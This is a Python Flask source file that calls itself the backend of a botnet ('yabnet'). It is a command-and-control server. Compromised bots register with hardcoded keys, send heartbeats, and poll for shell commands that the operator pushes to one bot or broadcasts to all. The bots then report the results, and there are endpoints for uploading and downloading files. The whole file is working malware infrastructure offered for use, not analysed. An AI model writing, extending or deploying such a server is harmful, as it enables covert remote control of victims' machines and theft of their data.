import os 

from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory 
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime  

from models import Bot
from models import Command
from models import db 
from models import User 

"""
Name: server.py 
Description: Python Flask Backend for the botnet. Takes care of the bot/command database and the API related with it. 
Also takes are of master console's request/response. 

"""

app = Flask(__name__)
app.config['DEBUG'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
app.config['UPLOAD_FOLDER'] = '/opt/yabnet/uploads'
db.app = app
db.init_app(app)

UPLOAD_DIRECTORY="/opt/yabnet/uploads"
if not os.path.exists(UPLOAD_DIRECTORY):
    os.makedirs(UPLOAD_DIRECTORY)

# Users - CHANGE ME for operation!! 
MASTERNAME = 'u'
MASTERPASSWORD = 'p'

# TODO: Change the register key to change dynamically 
# Keys - Hardcoded for now, going to make them random
FIRSTCONTACTKEY = 'firstcontactkey'
REGISTERKEY = 'registerkey'
MASTERKEY = 'masterkey'

# TODO: Implement this function 
def posterrorcheck(requestobj, *args):
    """
    Description: Post check will see if the incoming post request from python flask 
    has any errors or not. 

    Params: 
        - requestobj = Request object which comes from python flask 
        - *args (or **kwargs) = number of parmeters that need to be checked 
            - ex) 'firstcontactkey', 'user', 'ip'
            - This dynamic argument will depend on endpoint to endpoint 

    Return: 
        - (json) errorstring = Error string wrapped around jsonify({'error': <error>})
        - (bool) True = If everything is good, it's goodchie 

    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = requestobj.form

    if data is None:
        return jsonify({'error': 'post parameters cannot be null'})

    for arg in args:
        try:
            if data[arg] is None:
                return jsonify({'error': 'parameter'+str(arg)+'is missing'})
        except Exception as e:
            return jsonify({'error': str(e)})

    return True 

@app.route('/')
def hello_world():
    return "Hello, world!"

@app.route('/auth', methods=['POST'])
def authentication():
    error = posterrorcheck(request, 'username', 'password')
    if error is not True:
        return error 

    data = request.form
    username = data['username']
    password = data['password']

    print("[DEBUG] username = ", username)
    print("[DEBUG] password = ", password)

    try:
        user = User.query.filter_by(username=username).first()
        if (user.check_password(password)):
            return jsonify({'result':'SUCCESS', 'masterkey': MASTERKEY})
        else:
            return jsonify({'result': 'Wrong username and/or password'})

    except Exception as e:
        return jsonify({'result': 'Wrong username and/or password'})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Description: Endpoint which takes report of bots' heartbeat. Will check
    if the bot is still alive, and update the timestamp of the bot as well. 
    """

    # Error checking 
    error = posterrorcheck(request, 'ip', 'user')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form

    ip = data['ip']
    user = data['user']

    # API Endpoint logic 
    # See if the bot exists, and if it does, update and refresh the timestamp    
    try:
        query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
        query_bot.set_timestamp(datetime.now())

    except Exception as e:
        return jsonify({'error': '[-] Heartbeat not available for you'})

    return 'heartbeat'

@app.route('/firstcontact', methods=['POST'])
def firstcontact(): 
    """
    Description: Endpoint which retrieves first contact from the bot. 
    
    [POST] 
        - (str) firstcontactkey : firstcontact key to identify if the 
        contact is coming from the implant or not 
    """

    # Error checking 
    error = posterrorcheck(request, 'firstcontactkey')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    firstcontact = data['firstcontactkey']

    # API Endpoint logic 
    if firstcontact == FIRSTCONTACTKEY:
        return jsonify({'result': 'success', 'registerkey': 'registerkey'})
    else:
        return jsonify({'error': 'wrong firstcontactkey'})

@app.route('/register', methods=['POST'])
def register():
    """
    Description: Register a new bot to the server 

    [POST] 
        - registerkey = Register key that is needed for the registration process. 
        The key could be obtained through the firstcontact. 

        - ip = IP address of the bot 
        - os = OS type (Nix/Windows) of the bot 
    """

    # Error checking 
    error = posterrorcheck(request, 'registerkey', 'ip', 'os', 'user')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    registerkey = data['registerkey']
    bot_ip = data['ip']
    bot_os = data['os']
    bot_user = data['user']

    # API Endpoint logic 
    try:
        query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
    except Exception as e:
        print("[!]", e)

    if query_bot is not None:
        return jsonify({'error': 'Bot already registered'})

    else:
        print("[+] Added a new bot !")
        bot = Bot(bot_ip, bot_os, bot_user)
        db.session.add(bot)
        db.session.commit()

        return jsonify({'result': 'Bot was added'})


@app.route('/bot/<bot_ip>/push', methods=['POST'])
def botpush(bot_ip):
    """
    Description: Pushes the command into the cmd Model. 

    [POST]
        - masterkey = Master's secret key 
        - cmd = Command to push to the bot 
    """

    # Error checking 
    error = posterrorcheck(request, 'masterkey', 'cmd')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    masterkey = data['masterkey']
    cmd = data['cmd']

    # API Endpoint logic 
    try:
        # Query and get the bot which has the bot_ip, and then append the command to it 
        query_bot = Bot.query.filter_by(ip=bot_ip).first()
        cmd = Command(cmd, query_bot.id, bot_ip)

        # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
        if len(query_bot.cmds) < 1:
            try:
                query_bot.cmds.append(cmd)
                db.session.add(cmd)
                db.session.commit()

                print("[DEBUG] Command staged")

                return jsonify({'result': 'Command staged'})

            except Exception as e:
                return jsonify({'error': 'Error occurred while staging command'})
        else:
            return jsonify({'error': 'Only one command can be staged'})

    except Exception as e:
        return jsonify({ 'error': '[-] Bot does not exist. ' + str(e) }) 

@app.route('/bot/<bot_ip>/task', methods=['POST'])
def bottask(bot_ip):
    """
    Description: Shows the command that is staged for the corresponding bot. 
    The bot will visit this endpoint, retrieve the command, and execute it in the 
    target machine 

    [POST]
        - registerkey = "Authentication" key for the bot  
    """

    # Error checking 
    error = posterrorcheck(request, 'registerkey')
    if error is not True:
        return error 

    # POST Parmeter parsing 
    data = request.form
    registerkey = data['registerkey']

    # API Endpoint logic 
    try:
        # Get the bot corresponding with the bot_ip
        try: 
            query_bot = Bot.query.filter_by(ip=bot_ip).first()
            query_bot.set_timestamp(datetime.now())

        except Exception as e:
            return jsonify({'error' : '[-] There are no commands for you'})

        # Try getting commands, from the oldest staged command to the lastest staged command. 
        try:
            command = query_bot.cmds[0]
        except Exception as e:
            return jsonify({'error': '[-] There are no commands available'})

        return jsonify({ 'command': command.cmd })


    except Exception as e:
        return jsonify({ 'error': str(e) }) 

@app.route('/bot/<bot_ip>/result', methods=['POST'])
def botresult(bot_ip):
    """
    Description: API endpoint which the bot comes and reports the result of the staged command. 
    If a bot visits, the endpoint will update the result of the Command Model of the corresponding bot. 

    If a master visits, the endpoint will show the result.

    [POST]
        - key = Either bot_unique_key or masterkey. Endpoint's behavior changes correspondingly 
        - result = 
    """

    # Error checking 
    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    # POST Parameter parsing 
    data = request.form
    if data is None:
        return jsonify({'error': 'body cannot be empty'})

    # API Endpoint logic 
    try:
        # Bot visiting endpoint with result. Push result into the database.  
        if 'registerkey' in data:
            if data['registerkey'] == REGISTERKEY:
                result = data['result']

                query_bot = Bot.query.filter_by(ip=bot_ip).first()
                command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
                command.set_result(result)
                query_bot.cmds.remove(command)
                db.session.commit()
                
                # This needs to be changed 
                return '' 

        # Master visiting endpoint. Return result of the command. 
        elif 'masterkey' in data:
            try:
                query_bot = Bot.query.filter_by(ip=bot_ip).first()
                command = Command.query.filter_by(bot_ip=bot_ip).order_by(Command.id.desc()).first()
                result = command.result

                if result is None:
                    return jsonify({'error': 'Bot have not called back'})
                else:
                    return result 

            except Exception as e:
                return jsonify({ 'error': str(e) })

        else:
            return jsonify({'error': 'reigsterkey/masterkey cannot be empty'})

    except Exception as e:
        return jsonify({ 'error': str(e) })
    

# TODO: Change the result to json, as this is an API endpoint 
@app.route('/bot/list', methods=['POST'])
def botlist():
    """
    Description: View and return all the bots in the server database
    TODO: Implement returning bot objects in json format 
    TODO2: Implement filtering function - wait on this thought for now 
    """

    # Error checking 
    error = posterrorcheck(request, 'masterkey')
    if error is not True:
        return error 

    try:
        botlist = Bot.query.all()
    except Exception as e:
        return jsonify({'error': str(e)})

    # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
    for bot in botlist:
        if (datetime.now() - bot.timestamp).total_seconds() > 30:
            db.session.delete(bot)
        db.session.commit()

    result = '' 

    # Show bot list 
    for bot in botlist:
        result += bot.get_info() + '\n'

    return result

@app.route('/bot/commands', methods=['POST'])
def commandlist():

    # Error checking 
    error = posterrorcheck(request, 'registerkey')
    if error is not True:
        return error 

    try:
        commandlist = Command.query.all()
    except Exception as e:
        return jsonify({'error': str(e)})

    result = ''

    for command in commandlist:
        result += command.get_info()
        #print (command.get_info())

    return result 


@app.route('/bot/broadcast', methods=['POST'])
def broadcast():
    """
    Description: Push the command into all the bots in the database 

    [POST]
        - masterkey = Masterkey to validate and authenticate master
        - command = Actual command to be pushed to the entire bots 
    """

    # Error checking 
    error = posterrorcheck(request, 'masterkey', 'cmd')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    masterkey = data['masterkey']
    command = data['cmd']


    # API Endpoint logic 
    bots = Bot.query.all()

    try:
        for bot in bots:
            cmd = Command(command, bot.id, bot.ip)
            bot.cmds.append(cmd)
            db.session.add(cmd)
        db.session.commit()

    except Exception as e:
        return jsonify({ 'error': str(e) })

    return jsonify({ 'result': '[+] Broadcast successful' })

# This is for testing purposes 
@app.route('/files')
def list_files():
    files = [] 
    for item in os.listdir(UPLOAD_DIRECTORY):
        path = os.path.join(UPLOAD_DIRECTORY, item)
        if os.path.isfile(path):
            files.append(item)
    
    return jsonify(files)

@app.route('/upload')
def upload_file():
    """
    Description: File upload endpoint for the bots 
    """
    uploaded_file = request.files['file']

    try:
        uploaded_file.save(os.path.join(app.config['UPLOAD_FOLDER'], uploaded_file))
    except Exception as e:
        return jsonify({'error': str(e)})
    
    return jsonify({'success': '[DEBUG] File has been uploaded'})

@app.route('/download/<filename>')
def download_file():
    """
    Description: File download endpoint for the bots to visit and download specific files
    """
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)



# ========================= Flask App Starts ======================


def init_db():
    db.drop_all()
    db.create_all()
    master = User(username=MASTERNAME)
    master.set_password(MASTERPASSWORD)
    db.session.add(master)
    db.session.commit()


init_db()

if __name__ == '__main__':
    #app.run()
    app.run(host='0.0.0.0')